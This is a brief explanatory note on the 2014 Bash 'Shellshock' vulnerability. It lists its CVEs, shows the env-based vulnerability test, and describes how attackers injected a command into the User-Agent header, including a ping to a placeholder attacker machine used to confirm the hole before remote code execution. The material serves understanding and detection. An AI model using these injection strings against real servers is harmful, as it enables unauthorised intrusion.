Linux Bash vulnerability disclosed to the public on 24/09/2014.
From there different CVEs were attributed to different attack vectors:
. CVE-2014-6271
. CVE-2014-6277
. CVE-2014-6278
. CVE-2014-7169
. CVE-2014-7186
. CVE-2014-7187

The initial assigned CVE, CVE-2014-6271, was accompanied by a method to check if systems were vulnerable or not:
. env x=' () ( :;); echo vulnerable' bash -c "echo this is a test"

When executed in a vulnerable system, the above command executes an environment variable calles "x".
"x" in turn runs the "echo vulnerable" command, which is OUTSIDE of the environment variable function.
On a fully patched system, the command returns "this is a test".

One of the first way to exploit this vulnerability was to modify the content of the "User-Agent" web requests variable
 in order to check if a remote system was vulnerable.
 In the User-Agent, an attacker inserted a string like this: 
    env x=' () ( :;); echo vulnerable' ping -c 5 -p [UNIQUE_PAYLOAD] [ATTACKER_MACHINE]
 The attacker waited then to receive a ping with the crafted payload. Once received the vulnerability was confirmed.
 From there, crafting another requests, the attacker gained RCE on the remote system.
 
Nmap http-shellshock checks if a remote .cgi webpage (found with dirbuster in the cgi-bin folder) is vulnerable or not.
